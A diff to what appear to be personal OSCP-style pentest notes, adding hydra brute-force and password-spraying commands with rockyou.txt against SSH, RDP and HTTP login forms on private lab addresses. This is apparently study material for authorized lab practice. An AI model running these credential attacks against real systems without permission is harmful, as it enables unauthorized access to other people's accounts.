@@ -5,7 +5,7 @@
 <http://gchq.github.io/CyberChef/>
 <http://openwall.info/wiki/john/sample-hashes>
 
-## directory
+## dictionary
 
 ```bash
 /usr/share/wordlists/
@@ -36,8 +36,12 @@ medusa -h 10.11.0.22 -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR
 ### hydra
 
 ```bash
-hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.11.12.10
+hydra -l george -P ~/OSCP/rockyou.txt -s 2222 ssh://192.168.161.201
+hydra -L ./user.txt -p "SuperS3cure1337#" rdp://192.168.161.202
 
+hydra -l admin -P ~/OSCP/rockyou.txt 192.168.161.201 http-get 
+
+hydra -l admin -P ~/OSCP/rockyou.txt 192.168.161.201 http-post-form "/index.php:fm_usr=^USER^&fm_pwd=^PASS^:Login failed"
 hydra 10.1.0.2 http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid Password!" -l admin -P /usr/share/wordlists/rockyou.txt -t 10 -w 30 -o hydra-http-post-form.txt
 ```
 
